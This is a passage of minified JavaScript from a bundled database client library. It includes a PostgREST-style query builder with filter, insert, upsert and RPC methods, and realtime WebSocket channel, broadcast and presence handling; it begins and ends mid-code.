m="";const x=u?.cause;if(x){var y,v,k,_;const w=(y=x?.message)!==null&&y!==void 0?y:"",E=(v=x?.code)!==null&&v!==void 0?v:"";m=`${(k=u?.name)!==null&&k!==void 0?k:"FetchError"}: ${u?.message}`,m+=`

Caused by: ${(_=x?.name)!==null&&_!==void 0?_:"Error"}: ${w}`,E&&(m+=` (${E})`),x?.stack&&(m+=`
${x.stack}`)}else{var S;m=(S=u?.stack)!==null&&S!==void 0?S:""}return{error:{message:`${(h=u?.name)!==null&&h!==void 0?h:"FetchError"}: ${u?.message}`,details:m,hint:"",code:""},data:null,count:null,status:0,statusText:""}})),c.then(a,r)}returns(){return this}overrideTypes(){return this}},gx=class extends xx{select(a){let r=!1;const n=(a??"*").split("").map(l=>/\s/.test(l)&&!r?"":(l==='"'&&(r=!r),l)).join("");return this.url.searchParams.set("select",n),this.headers.append("Prefer","return=representation"),this}order(a,{ascending:r=!0,nullsFirst:n,foreignTable:l,referencedTable:c=l}={}){const u=c?`${c}.order`:"order",h=this.url.searchParams.get(u);return this.url.searchParams.set(u,`${h?`${h},`:""}${a}.${r?"asc":"desc"}${n===void 0?"":n?".nullsfirst":".nullslast"}`),this}limit(a,{foreignTable:r,referencedTable:n=r}={}){const l=typeof n>"u"?"limit":`${n}.limit`;return this.url.searchParams.set(l,`${a}`),this}range(a,r,{foreignTable:n,referencedTable:l=n}={}){const c=typeof l>"u"?"offset":`${l}.offset`,u=typeof l>"u"?"limit":`${l}.limit`;return this.url.searchParams.set(c,`${a}`),this.url.searchParams.set(u,`${r-a+1}`),this}abortSignal(a){return this.signal=a,this}single(){return this.headers.set("Accept","application/vnd.pgrst.object+json"),this}maybeSingle(){return this.method==="GET"?this.headers.set("Accept","application/json"):this.headers.set("Accept","application/vnd.pgrst.object+json"),this.isMaybeSingle=!0,this}csv(){return this.headers.set("Accept","text/csv"),this}geojson(){return this.headers.set("Accept","application/geo+json"),this}explain({analyze:a=!1,verbose:r=!1,settings:n=!1,buffers:l=!1,wal:c=!1,format:u="text"}={}){var h;const m=[a?"analyze":null,r?"verbose":null,n?"settings":null,l?"buffers":null,c?"wal":null].filter(Boolean).join("|"),x=(h=this.headers.get("Accept"))!==null&&h!==void 0?h:"application/json";return this.headers.set("Accept",`application/vnd.pgrst.plan+${u}; for="${x}"; options=${m};`),u==="json"?this:this}rollback(){return this.headers.append("Prefer","tx=rollback"),this}returns(){return this}maxAffected(a){return this.headers.append("Prefer","handling=strict"),this.headers.append("Prefer",`max-affected=${a}`),this}};const Hh=new RegExp("[,()]");var Ln=class extends gx{eq(a,r){return this.url.searchParams.append(a,`eq.${r}`),this}neq(a,r){return this.url.searchParams.append(a,`neq.${r}`),this}gt(a,r){return this.url.searchParams.append(a,`gt.${r}`),this}gte(a,r){return this.url.searchParams.append(a,`gte.${r}`),this}lt(a,r){return this.url.searchParams.append(a,`lt.${r}`),this}lte(a,r){return this.url.searchParams.append(a,`lte.${r}`),this}like(a,r){return this.url.searchParams.append(a,`like.${r}`),this}likeAllOf(a,r){return this.url.searchParams.append(a,`like(all).{${r.join(",")}}`),this}likeAnyOf(a,r){return this.url.searchParams.append(a,`like(any).{${r.join(",")}}`),this}ilike(a,r){return this.url.searchParams.append(a,`ilike.${r}`),this}ilikeAllOf(a,r){return this.url.searchParams.append(a,`ilike(all).{${r.join(",")}}`),this}ilikeAnyOf(a,r){return this.url.searchParams.append(a,`ilike(any).{${r.join(",")}}`),this}regexMatch(a,r){return this.url.searchParams.append(a,`match.${r}`),this}regexIMatch(a,r){return this.url.searchParams.append(a,`imatch.${r}`),this}is(a,r){return this.url.searchParams.append(a,`is.${r}`),this}isDistinct(a,r){return this.url.searchParams.append(a,`isdistinct.${r}`),this}in(a,r){const n=Array.from(new Set(r)).map(l=>typeof l=="string"&&Hh.test(l)?`"${l}"`:`${l}`).join(",");return this.url.searchParams.append(a,`in.(${n})`),this}notIn(a,r){const n=Array.from(new Set(r)).map(l=>typeof l=="string"&&Hh.test(l)?`"${l}"`:`${l}`).join(",");return this.url.searchParams.append(a,`not.in.(${n})`),this}contains(a,r){return typeof r=="string"?this.url.searchParams.append(a,`cs.${r}`):Array.isArray(r)?this.url.searchParams.append(a,`cs.{${r.join(",")}}`):this.url.searchParams.append(a,`cs.${JSON.stringify(r)}`),this}containedBy(a,r){return typeof r=="string"?this.url.searchParams.append(a,`cd.${r}`):Array.isArray(r)?this.url.searchParams.append(a,`cd.{${r.join(",")}}`):this.url.searchParams.append(a,`cd.${JSON.stringify(r)}`),this}rangeGt(a,r){return this.url.searchParams.append(a,`sr.${r}`),this}rangeGte(a,r){return this.url.searchParams.append(a,`nxl.${r}`),this}rangeLt(a,r){return this.url.searchParams.append(a,`sl.${r}`),this}rangeLte(a,r){return this.url.searchParams.append(a,`nxr.${r}`),this}rangeAdjacent(a,r){return this.url.searchParams.append(a,`adj.${r}`),this}overlaps(a,r){return typeof r=="string"?this.url.searchParams.append(a,`ov.${r}`):this.url.searchParams.append(a,`ov.{${r.join(",")}}`),this}textSearch(a,r,{config:n,type:l}={}){let c="";l==="plain"?c="pl":l==="phrase"?c="ph":l==="websearch"&&(c="w");const u=n===void 0?"":`(${n})`;return this.url.searchParams.append(a,`${c}fts${u}.${r}`),this}match(a){return Object.entries(a).forEach(([r,n])=>{this.url.searchParams.append(r,`eq.${n}`)}),this}not(a,r,n){return this.url.searchParams.append(a,`not.${r}.${n}`),this}or(a,{foreignTable:r,referencedTable:n=r}={}){const l=n?`${n}.or`:"or";return this.url.searchParams.append(l,`(${a})`),this}filter(a,r,n){return this.url.searchParams.append(a,`${r}.${n}`),this}},yx=class{constructor(a,{headers:r={},schema:n,fetch:l}){this.url=a,this.headers=new Headers(r),this.schema=n,this.fetch=l}cloneRequestState(){return{url:new URL(this.url.toString()),headers:new Headers(this.headers)}}select(a,r){const{head:n=!1,count:l}=r??{},c=n?"HEAD":"GET";let u=!1;const h=(a??"*").split("").map(y=>/\s/.test(y)&&!u?"":(y==='"'&&(u=!u),y)).join(""),{url:m,headers:x}=this.cloneRequestState();return m.searchParams.set("select",h),l&&x.append("Prefer",`count=${l}`),new Ln({method:c,url:m,headers:x,schema:this.schema,fetch:this.fetch})}insert(a,{count:r,defaultToNull:n=!0}={}){var l;const c="POST",{url:u,headers:h}=this.cloneRequestState();if(r&&h.append("Prefer",`count=${r}`),n||h.append("Prefer","missing=default"),Array.isArray(a)){const m=a.reduce((x,y)=>x.concat(Object.keys(y)),[]);if(m.length>0){const x=[...new Set(m)].map(y=>`"${y}"`);u.searchParams.set("columns",x.join(","))}}return new Ln({method:c,url:u,headers:h,schema:this.schema,body:a,fetch:(l=this.fetch)!==null&&l!==void 0?l:fetch})}upsert(a,{onConflict:r,ignoreDuplicates:n=!1,count:l,defaultToNull:c=!0}={}){var u;const h="POST",{url:m,headers:x}=this.cloneRequestState();if(x.append("Prefer",`resolution=${n?"ignore":"merge"}-duplicates`),r!==void 0&&m.searchParams.set("on_conflict",r),l&&x.append("Prefer",`count=${l}`),c||x.append("Prefer","missing=default"),Array.isArray(a)){const y=a.reduce((v,k)=>v.concat(Object.keys(k)),[]);if(y.length>0){const v=[...new Set(y)].map(k=>`"${k}"`);m.searchParams.set("columns",v.join(","))}}return new Ln({method:h,url:m,headers:x,schema:this.schema,body:a,fetch:(u=this.fetch)!==null&&u!==void 0?u:fetch})}update(a,{count:r}={}){var n;const l="PATCH",{url:c,headers:u}=this.cloneRequestState();return r&&u.append("Prefer",`count=${r}`),new Ln({method:l,url:c,headers:u,schema:this.schema,body:a,fetch:(n=this.fetch)!==null&&n!==void 0?n:fetch})}delete({count:a}={}){var r;const n="DELETE",{url:l,headers:c}=this.cloneRequestState();return a&&c.append("Prefer",`count=${a}`),new Ln({method:n,url:l,headers:c,schema:this.schema,fetch:(r=this.fetch)!==null&&r!==void 0?r:fetch})}},vx=class Af{constructor(r,{headers:n={},schema:l,fetch:c}={}){this.url=r,this.headers=new Headers(n),this.schemaName=l,this.fetch=c}from(r){if(!r||typeof r!="string"||r.trim()==="")throw new Error("Invalid relation name: relation must be a non-empty string.");return new yx(new URL(`${this.url}/${r}`),{headers:new Headers(this.headers),schema:this.schemaName,fetch:this.fetch})}schema(r){return new Af(this.url,{headers:this.headers,schema:r,fetch:this.fetch})}rpc(r,n={},{head:l=!1,get:c=!1,count:u}={}){var h;let m;const x=new URL(`${this.url}/rpc/${r}`);let y;const v=S=>S!==null&&typeof S=="object"&&(!Array.isArray(S)||S.some(v)),k=l&&Object.values(n).some(v);k?(m="POST",y=n):l||c?(m=l?"HEAD":"GET",Object.entries(n).filter(([S,w])=>w!==void 0).map(([S,w])=>[S,Array.isArray(w)?`{${w.join(",")}}`:`${w}`]).forEach(([S,w])=>{x.searchParams.append(S,w)})):(m="POST",y=n);const _=new Headers(this.headers);return k?_.set("Prefer",u?`count=${u},return=minimal`:"return=minimal"):u&&_.set("Prefer",`count=${u}`),new Ln({method:m,url:x,headers:_,schema:this.schemaName,body:y,fetch:(h=this.fetch)!==null&&h!==void 0?h:fetch})}};class wx{constructor(){}static detectEnvironment(){var r;if(typeof WebSocket<"u")return{type:"native",constructor:WebSocket};if(typeof globalThis<"u"&&typeof globalThis.WebSocket<"u")return{type:"native",constructor:globalThis.WebSocket};if(typeof global<"u"&&typeof global.WebSocket<"u")return{type:"native",constructor:global.WebSocket};if(typeof globalThis<"u"&&typeof globalThis.WebSocketPair<"u"&&typeof globalThis.WebSocket>"u")return{type:"cloudflare",error:"Cloudflare Workers detected. WebSocket clients are not supported in Cloudflare Workers.",workaround:"Use Cloudflare Workers WebSocket API for server-side WebSocket handling, or deploy to a different runtime."};if(typeof globalThis<"u"&&globalThis.EdgeRuntime||typeof navigator<"u"&&(!((r=navigator.userAgent)===null||r===void 0)&&r.includes("Vercel-Edge")))return{type:"unsupported",error:"Edge runtime detected (Vercel Edge/Netlify Edge). WebSockets are not supported in edge functions.",workaround:"Use serverless functions or a different deployment target for WebSocket functionality."};const n=globalThis.process;if(n){const l=n.versions;if(l&&l.node){const c=l.node,u=parseInt(c.replace(/^v/,"").split(".")[0]);return u>=22?typeof globalThis.WebSocket<"u"?{type:"native",constructor:globalThis.WebSocket}:{type:"unsupported",error:`Node.js ${u} detected but native WebSocket not found.`,workaround:"Provide a WebSocket implementation via the transport option."}:{type:"unsupported",error:`Node.js ${u} detected without native WebSocket support.`,workaround:`For Node.js < 22, install "ws" package and provide it via the transport option:
import ws from "ws"
new RealtimeClient(url, { transport: ws })`}}}return{type:"unsupported",error:"Unknown JavaScript runtime without WebSocket support.",workaround:"Ensure you're running in a supported environment (browser, Node.js, Deno) or provide a custom WebSocket implementation."}}static getWebSocketConstructor(){const r=this.detectEnvironment();if(r.constructor)return r.constructor;let n=r.error||"WebSocket not supported in this environment.";throw r.workaround&&(n+=`

Suggested solution: ${r.workaround}`),new Error(n)}static createWebSocket(r,n){const l=this.getWebSocketConstructor();return new l(r,n)}static isWebSocketSupported(){try{const r=this.detectEnvironment();return r.type==="native"||r.type==="ws"}catch{return!1}}}const bx="2.90.1",jx=`realtime-js/${bx}`,Of="1.0.0",kx="2.0.0",Kh=Of,Cc=1e4,_x=1e3,Nx=100;var Rs;(function(a){a[a.connecting=0]="connecting",a[a.open=1]="open",a[a.closing=2]="closing",a[a.closed=3]="closed"})(Rs||(Rs={}));var ht;(function(a){a.closed="closed",a.errored="errored",a.joined="joined",a.joining="joining",a.leaving="leaving"})(ht||(ht={}));var Sr;(function(a){a.close="phx_close",a.error="phx_error",a.join="phx_join",a.reply="phx_reply",a.leave="phx_leave",a.access_token="access_token"})(Sr||(Sr={}));var Tc;(function(a){a.websocket="websocket"})(Tc||(Tc={}));var rn;(function(a){a.Connecting="connecting",a.Open="open",a.Closing="closing",a.Closed="closed"})(rn||(rn={}));class Sx{constructor(r){this.HEADER_LENGTH=1,this.USER_BROADCAST_PUSH_META_LENGTH=6,this.KINDS={userBroadcastPush:3,userBroadcast:4},this.BINARY_ENCODING=0,this.JSON_ENCODING=1,this.BROADCAST_EVENT="broadcast",this.allowedMetadataKeys=[],this.allowedMetadataKeys=r??[]}encode(r,n){if(r.event===this.BROADCAST_EVENT&&!(r.payload instanceof ArrayBuffer)&&typeof r.payload.event=="string")return n(this._binaryEncodeUserBroadcastPush(r));let l=[r.join_ref,r.ref,r.topic,r.event,r.payload];return n(JSON.stringify(l))}_binaryEncodeUserBroadcastPush(r){var n;return this._isArrayBuffer((n=r.payload)===null||n===void 0?void 0:n.payload)?this._encodeBinaryUserBroadcastPush(r):this._encodeJsonUserBroadcastPush(r)}_encodeBinaryUserBroadcastPush(r){var n,l;const c=(l=(n=r.payload)===null||n===void 0?void 0:n.payload)!==null&&l!==void 0?l:new ArrayBuffer(0);return this._encodeUserBroadcastPush(r,this.BINARY_ENCODING,c)}_encodeJsonUserBroadcastPush(r){var n,l;const c=(l=(n=r.payload)===null||n===void 0?void 0:n.payload)!==null&&l!==void 0?l:{},h=new TextEncoder().encode(JSON.stringify(c)).buffer;return this._encodeUserBroadcastPush(r,this.JSON_ENCODING,h)}_encodeUserBroadcastPush(r,n,l){var c,u;const h=r.topic,m=(c=r.ref)!==null&&c!==void 0?c:"",x=(u=r.join_ref)!==null&&u!==void 0?u:"",y=r.payload.event,v=this.allowedMetadataKeys?this._pick(r.payload,this.allowedMetadataKeys):{},k=Object.keys(v).length===0?"":JSON.stringify(v);if(x.length>255)throw new Error(`joinRef length ${x.length} exceeds maximum of 255`);if(m.length>255)throw new Error(`ref length ${m.length} exceeds maximum of 255`);if(h.length>255)throw new Error(`topic length ${h.length} exceeds maximum of 255`);if(y.length>255)throw new Error(`userEvent length ${y.length} exceeds maximum of 255`);if(k.length>255)throw new Error(`metadata length ${k.length} exceeds maximum of 255`);const _=this.USER_BROADCAST_PUSH_META_LENGTH+x.length+m.length+h.length+y.length+k.length,S=new ArrayBuffer(this.HEADER_LENGTH+_);let w=new DataView(S),E=0;w.setUint8(E++,this.KINDS.userBroadcastPush),w.setUint8(E++,x.length),w.setUint8(E++,m.length),w.setUint8(E++,h.length),w.setUint8(E++,y.length),w.setUint8(E++,k.length),w.setUint8(E++,n),Array.from(x,D=>w.setUint8(E++,D.charCodeAt(0))),Array.from(m,D=>w.setUint8(E++,D.charCodeAt(0))),Array.from(h,D=>w.setUint8(E++,D.charCodeAt(0))),Array.from(y,D=>w.setUint8(E++,D.charCodeAt(0))),Array.from(k,D=>w.setUint8(E++,D.charCodeAt(0)));var T=new Uint8Array(S.byteLength+l.byteLength);return T.set(new Uint8Array(S),0),T.set(new Uint8Array(l),S.byteLength),T.buffer}decode(r,n){if(this._isArrayBuffer(r)){let l=this._binaryDecode(r);return n(l)}if(typeof r=="string"){const l=JSON.parse(r),[c,u,h,m,x]=l;return n({join_ref:c,ref:u,topic:h,event:m,payload:x})}return n({})}_binaryDecode(r){const n=new DataView(r),l=n.getUint8(0),c=new TextDecoder;if(l===this.KINDS.userBroadcast)return this._decodeUserBroadcast(r,n,c)}_decodeUserBroadcast(r,n,l){const c=n.getUint8(1),u=n.getUint8(2),h=n.getUint8(3),m=n.getUint8(4);let x=this.HEADER_LENGTH+4;const y=l.decode(r.slice(x,x+c));x=x+c;const v=l.decode(r.slice(x,x+u));x=x+u;const k=l.decode(r.slice(x,x+h));x=x+h;const _=r.slice(x,r.byteLength),S=m===this.JSON_ENCODING?JSON.parse(l.decode(_)):_,w={type:this.BROADCAST_EVENT,event:v,payload:S};return h>0&&(w.meta=JSON.parse(k)),{join_ref:null,ref:null,topic:y,event:this.BROADCAST_EVENT,payload:w}}_isArrayBuffer(r){var n;return r instanceof ArrayBuffer||((n=r?.constructor)===null||n===void 0?void 0:n.name)==="ArrayBuffer"}_pick(r,n){return!r||typeof r!="object"?{}:Object.fromEntries(Object.entries(r).filter(([l])=>n.includes(l)))}}class If{constructor(r,n){this.callback=r,this.timerCalc=n,this.timer=void 0,this.tries=0,this.callback=r,this.timerCalc=n}reset(){this.tries=0,clearTimeout(this.timer),this.timer=void 0}scheduleTimeout(){clearTimeout(this.timer),this.timer=setTimeout(()=>{this.tries=this.tries+1,this.callback()},this.timerCalc(this.tries+1))}}var Ve;(function(a){a.abstime="abstime",a.bool="bool",a.date="date",a.daterange="daterange",a.float4="float4",a.float8="float8",a.int2="int2",a.int4="int4",a.int4range="int4range",a.int8="int8",a.int8range="int8range",a.json="json",a.jsonb="jsonb",a.money="money",a.numeric="numeric",a.oid="oid",a.reltime="reltime",a.text="text",a.time="time",a.timestamp="timestamp",a.timestamptz="timestamptz",a.timetz="timetz",a.tsrange="tsrange",a.tstzrange="tstzrange"})(Ve||(Ve={}));const Gh=(a,r,n={})=>{var l;const c=(l=n.skipTypes)!==null&&l!==void 0?l:[];return r?Object.keys(r).reduce((u,h)=>(u[h]=Ex(h,a,r,c),u),{}):{}},Ex=(a,r,n,l)=>{const c=r.find(m=>m.name===a),u=c?.type,h=n[a];return u&&!l.includes(u)?$f(u,h):Rc(h)},$f=(a,r)=>{if(a.charAt(0)==="_"){const n=a.slice(1,a.length);return Px(r,n)}switch(a){case Ve.bool:return Cx(r);case Ve.float4:case Ve.float8:case Ve.int2:case Ve.int4:case Ve.int8:case Ve.numeric:case Ve.oid:return Tx(r);case Ve.json:case Ve.jsonb:return Rx(r);case Ve.timestamp:return Ax(r);case Ve.abstime:case Ve.date:case Ve.daterange:case Ve.int4range:case Ve.int8range:case Ve.money:case Ve.reltime:case Ve.text:case Ve.time:case Ve.timestamptz:case Ve.timetz:case Ve.tsrange:case Ve.tstzrange:return Rc(r);default:return Rc(r)}},Rc=a=>a,Cx=a=>{switch(a){case"t":return!0;case"f":return!1;default:return a}},Tx=a=>{if(typeof a=="string"){const r=parseFloat(a);if(!Number.isNaN(r))return r}return a},Rx=a=>{if(typeof a=="string")try{return JSON.parse(a)}catch{return a}return a},Px=(a,r)=>{if(typeof a!="string")return a;const n=a.length-1,l=a[n];if(a[0]==="{"&&l==="}"){let u;const h=a.slice(1,n);try{u=JSON.parse("["+h+"]")}catch{u=h?h.split(","):[]}return u.map(m=>$f(r,m))}return a},Ax=a=>typeof a=="string"?a.replace(" ","T"):a,Df=a=>{const r=new URL(a);return r.protocol=r.protocol.replace(/^ws/i,"http"),r.pathname=r.pathname.replace(/\/+$/,"").replace(/\/socket\/websocket$/i,"").replace(/\/socket$/i,"").replace(/\/websocket$/i,""),r.pathname===""||r.pathname==="/"?r.pathname="/api/broadcast":r.pathname=r.pathname+"/api/broadcast",r.href};class hc{constructor(r,n,l={},c=Cc){this.channel=r,this.event=n,this.payload=l,this.timeout=c,this.sent=!1,this.timeoutTimer=void 0,this.ref="",this.receivedResp=null,this.recHooks=[],this.refEvent=null}resend(r){this.timeout=r,this._cancelRefEvent(),this.ref="",this.refEvent=null,this.receivedResp=null,this.sent=!1,this.send()}send(){this._hasReceived("timeout")||(this.startTimeout(),this.sent=!0,this.channel.socket.push({topic:this.channel.topic,event:this.event,payload:this.payload,ref:this.ref,join_ref:this.channel._joinRef()}))}updatePayload(r){this.payload=Object.assign(Object.assign({},this.payload),r)}receive(r,n){var l;return this._hasReceived(r)&&n((l=this.receivedResp)===null||l===void 0?void 0:l.response),this.recHooks.push({status:r,callback:n}),this}startTimeout(){if(this.timeoutTimer)return;this.ref=this.channel.socket._makeRef(),this.refEvent=this.channel._replyEventName(this.ref);const r=n=>{this._cancelRefEvent(),this._cancelTimeout(),this.receivedResp=n,this._matchReceive(n)};this.channel._on(this.refEvent,{},r),this.timeoutTimer=setTimeout(()=>{this.trigger("timeout",{})},this.timeout)}trigger(r,n){this.refEvent&&this.channel._trigger(this.refEvent,{status:r,response:n})}destroy(){this._cancelRefEvent(),this._cancelTimeout()}_cancelRefEvent(){this.refEvent&&this.channel._off(this.refEvent,{})}_cancelTimeout(){clearTimeout(this.timeoutTimer),this.timeoutTimer=void 0}_matchReceive({status:r,response:n}){this.recHooks.filter(l=>l.status===r).forEach(l=>l.callback(n))}_hasReceived(r){return this.receivedResp&&this.receivedResp.status===r}}var Jh;(function(a){a.SYNC="sync",a.JOIN="join",a.LEAVE="leave"})(Jh||(Jh={}));class za{constructor(r,n){this.channel=r,this.state={},this.pendingDiffs=[],this.joinRef=null,this.enabled=!1,this.caller={onJoin:()=>{},onLeave:()=>{},onSync:()=>{}};const l=n?.events||{state:"presence_state",diff:"presence_diff"};this.channel._on(l.state,{},c=>{const{onJoin:u,onLeave:h,onSync:m}=this.caller;this.joinRef=this.channel._joinRef(),this.state=za.syncState(this.state,c,u,h),this.pendingDiffs.forEach(x=>{this.state=za.syncDiff(this.state,x,u,h)}),this.pendingDiffs=[],m()}),this.channel._on(l.diff,{},c=>{const{onJoin:u,onLeave:h,onSync:m}=this.caller;this.inPendingSyncState()?this.pendingDiffs.push(c):(this.state=za.syncDiff(this.state,c,u,h),m())}),this.onJoin((c,u,h)=>{this.channel._trigger("presence",{event:"join",key:c,currentPresences:u,newPresences:h})}),this.onLeave((c,u,h)=>{this.channel._trigger("presence",{event:"leave",key:c,currentPresences:u,leftPresences:h})}),this.onSync(()=>{this.channel._trigger("presence",{event:"sync"})})}static syncState(r,n,l,c){const u=this.cloneDeep(r),h=this.transformState(n),m={},x={};return this.map(u,(y,v)=>{h[y]||(x[y]=v)}),this.map(h,(y,v)=>{const k=u[y];if(k){const _=v.map(T=>T.presence_ref),S=k.map(T=>T.presence_ref),w=v.filter(T=>S.indexOf(T.presence_ref)<0),E=k.filter(T=>_.indexOf(T.presence_ref)<0);w.length>0&&(m[y]=w),E.length>0&&(x[y]=E)}else m[y]=v}),this.syncDiff(u,{joins:m,leaves:x},l,c)}static syncDiff(r,n,l,c){const{joins:u,leaves:h}={joins:this.transformState(n.joins),leaves:this.transformState(n.leaves)};return l||(l=()=>{}),c||(c=()=>{}),this.map(u,(m,x)=>{var y;const v=(y=r[m])!==null&&y!==void 0?y:[];if(r[m]=this.cloneDeep(x),v.length>0){const k=r[m].map(S=>S.presence_ref),_=v.filter(S=>k.indexOf(S.presence_ref)<0);r[m].unshift(..._)}l(m,v,x)}),this.map(h,(m,x)=>{let y=r[m];if(!y)return;const v=x.map(k=>k.presence_ref);y=y.filter(k=>v.indexOf(k.presence_ref)<0),r[m]=y,c(m,y,x),y.length===0&&delete r[m]}),r}static map(r,n){return Object.getOwnPropertyNames(r).map(l=>n(l,r[l]))}static transformState(r){return r=this.cloneDeep(r),Object.getOwnPropertyNames(r).reduce((n,l)=>{const c=r[l];return"metas"in c?n[l]=c.metas.map(u=>(u.presence_ref=u.phx_ref,delete u.phx_ref,delete u.phx_ref_prev,u)):n[l]=c,n},{})}static cloneDeep(r){return JSON.parse(JSON.stringify(r))}onJoin(r){this.caller.onJoin=r}onLeave(r){this.caller.onLeave=r}onSync(r){this.caller.onSync=r}inPendingSyncState(){return!this.joinRef||this.joinRef!==this.channel._joinRef()}}var Yh;(function(a){a.ALL="*",a.INSERT="INSERT",a.UPDATE="UPDATE",a.DELETE="DELETE"})(Yh||(Yh={}));var Ua;(function(a){a.BROADCAST="broadcast",a.PRESENCE="presence",a.POSTGRES_CHANGES="postgres_changes",a.SYSTEM="system"})(Ua||(Ua={}));var ts;(function(a){a.SUBSCRIBED="SUBSCRIBED",a.TIMED_OUT="TIMED_OUT",a.CLOSED="CLOSED",a.CHANNEL_ERROR="CHANNEL_ERROR"})(ts||(ts={}));class Bn{constructor(r,n={config:{}},l){var c,u;if(this.topic=r,this.params=n,this.socket=l,this.bindings={},this.state=ht.closed,this.joinedOnce=!1,this.pushBuffer=[],this.subTopic=r.replace(/^realtime:/i,""),this.params.config=Object.assign({broadcast:{ack:!1,self:!1},presence:{key:"",enabled:!1},private:!1},n.config),this.timeout=this.socket.timeout,this.joinPush=new hc(this,Sr.join,this.params,this.timeout),this.rejoinTimer=new If(()=>this._rejoinUntilConnected(),this.socket.reconnectAfterMs),this.joinPush.receive("ok",()=>{this.state=ht.joined,this.rejoinTimer.reset(),this.pushBuffer.forEach(h=>h.send()),this.pushBuffer=[]}),this._onClose(()=>{this.rejoinTimer.reset(),this.socket.log("channel",`close ${this.topic} ${this._joinRef()}`),this.state=ht.closed,this.socket._remove(this)}),this._onError(h=>{this._isLeaving()||this._isClosed()||(this.socket.log("channel",`error ${this.topic}`,h),this.state=ht.errored,this.rejoinTimer.scheduleTimeout())}),this.joinPush.receive("timeout",()=>{this._isJoining()&&(this.socket.log("channel",`timeout ${this.topic}`,this.joinPush.timeout),this.state=ht.errored,this.rejoinTimer.scheduleTimeout())}),this.joinPush.receive("error",h=>{this._isLeaving()||this._isClosed()||(this.socket.log("channel",`error ${this.topic}`,h),this.state=ht.errored,this.rejoinTimer.scheduleTimeout())}),this._on(Sr.reply,{},(h,m)=>{this._trigger(this._replyEventName(m),h)}),this.presence=new za(this),this.broadcastEndpointURL=Df(this.socket.endPoint),this.private=this.params.config.private||!1,!this.private&&(!((u=(c=this.params.config)===null||c===void 0?void 0:c.broadcast)===null||u===void 0)&&u.replay))throw`tried to use replay on public channel '${this.topic}'. It must be a private channel.`}subscribe(r,n=this.timeout){var l,c,u;if(this.socket.isConnected()||this.socket.connect(),this.state==ht.closed){const{config:{broadcast:h,presence:m,private:x}}=this.params,y=(c=(l=this.bindings.postgres_changes)===null||l===void 0?void 0:l.map(S=>S.filter))!==null&&c!==void 0?c:[],v=!!this.bindings[Ua.PRESENCE]&&this.bindings[Ua.PRESENCE].length>0||((u=this.params.config.presence)===null||u===void 0?void 0:u.enabled)===!0,k={},_={broadcast:h,presence:Object.assign(Object.assign({},m),{enabled:v}),postgres_changes:y,private:x};this.socket.accessTokenValue&&(k.access_token=this.socket.accessTokenValue),this._onError(S=>r?.(ts.CHANNEL_ERROR,S)),this._onClose(()=>r?.(ts.CLOSED)),this.updateJoinPayload(Object.assign({config:_},k)),this.joinedOnce=!0,this._rejoin(n),this.joinPush.receive("ok",async({postgres_changes:S})=>{var w;if(this.socket._isManualToken()||this.socket.setAuth(),S===void 0){r?.(ts.SUBSCRIBED);return}else{const E=this.bindings.postgres_changes,T=(w=E?.length)!==null&&w!==void 0?w:0,D=[];for(let z=0;z<T;z++){const I=E[z],{filter:{event:H,schema:te,table:J,filter:F}}=I,ne=S&&S[z];if(ne&&ne.event===H&&Bn.isFilterValueEqual(ne.schema,te)&&Bn.isFilterValueEqual(ne.table,J)&&Bn.isFilterValueEqual(ne.filter,F))D.push(Object.assign(Object.assign({},I),{id:ne.id}));else{this.unsubscribe(),this.state=ht.errored,r?.(ts.CHANNEL_ERROR,new Error("mismatch between server and client bindings for postgres changes"));return}}this.bindings.postgres_changes=D,r&&r(ts.SUBSCRIBED);return}}).receive("error",S=>{this.state=ht.errored,r?.(ts.CHANNEL_ERROR,new Error(JSON.stringify(Object.values(S).join(", ")||"error")))}).receive("timeout",()=>{r?.(ts.TIMED_OUT)})}return this}presenceState(){return this.presence.state}async track(r,n={}){return await this.send({type:"presence",event:"track",payload:r},n.timeout||this.timeout)}async untrack(r={}){return await this.send({type:"presence",event:"untrack"},r)}on(r,n,l){return this.state===ht.joined&&r===Ua.PRESENCE&&(this.socket.log("channel",`resubscribe to ${this.topic} due to change in presence callbacks on joined channel`),this.unsubscribe().then(async()=>await this.subscribe())),this._on(r,n,l)}async httpSend(r,n,l={}){var c;if(n==null)return Promise.reject("Payload is required for httpSend()");const u={apikey:this.socket.apiKey?this.socket.apiKey:"","Content-Type":"application/json"};this.socket.accessTokenValue&&(u.Authorization=`Bearer ${this.socket.accessTokenValue}`);const h={method:"POST",headers:u,body:JSON.stringify({messages:[{topic:this.subTopic,event:r,payload:n,private:this.private}]})},m=await this._fetchWithTimeout(this.broadcastEndpointURL,h,(c=l.timeout)!==null&&c!==void 0?c:this.timeout);if(m.status===202)return{success:!0};let x=m.statusText;try{const y=await m.json();x=y.error||y.message||x}catch{}return Promise.reject(new Error(x))}async send(r,n={}){var l,c;if(!this._canPush()&&r.type==="broadcast"){console.warn("Realtime send() is automatically falling back to REST API. This behavior will be deprecated in the future. Please use httpSend() explicitly for REST delivery.");const{event:u,payload:h}=r,m={apikey:this.socket.apiKey?this.socket.apiKey:"","Content-Type":"application/json"};this.socket.accessTokenValue&&(m.Authorization=`Bearer ${this.socket.accessTokenValue}`);const x={method:"POST",headers:m,body:JSON.stringify({messages:[{topic:this.subTopic,event:u,payload:h,private:this.private}]})};try{const y=await this._fetchWithTimeout(this.broadcastEndpointURL,x,(l=n.timeout)!==null&&l!==void 0?l:this.timeout);return await((c=y.body)===null||c===void 0?void 0:c.cancel()),y.ok?"ok":"error"}catch(y){return y.name==="AbortError"?"timed out":"error"}}else return new Promise(u=>{var h,m,x;const y=this._push(r.type,r,n.timeout||this.timeout);r.type==="broadcast"&&!(!((x=(m=(h=this.params)===null||h===void 0?void 0:h.config)===null||m===void 0?void 0:m.broadcast)===null||x===void 0)&&x.ack)&&u("ok"),y.receive("ok",()=>u("ok")),y.receive("error",()=>u("error")),y.receive("timeout",()=>u("timed out"))})}updateJoinPayload(r){this.joinPush.updatePayload(r)}unsubscribe(r=this.timeout){this.state=ht.leaving;const n=()=>{this.socket.log("channel",`leave ${this.topic}`),this._trigger(Sr.close,"leave",this._joinRef())};this.joinPush.destroy();let l=null;return new Promise(c=>{l=new hc(this,Sr.leave,{},r),l.receive("ok",()=>{n(),c("ok")}).receive("timeout",()=>{n(),c("timed out")}).receive("error",()=>{c("error")}),l.send(),this._canPush()||l.trigger("ok",{})}).finally(()=>{l?.destroy()})}teardown(){this.pushBuffer.forEach(r=>r.destroy()),this.pushBuffer=[],this.rejoinTimer.reset(),this.joinPush.destroy(),this.state=ht.closed,this.bindings={}}async _fetchWithTimeout(r,n,l){const c=new AbortController,u=setTimeout(()=>c.abort(),l),h=await 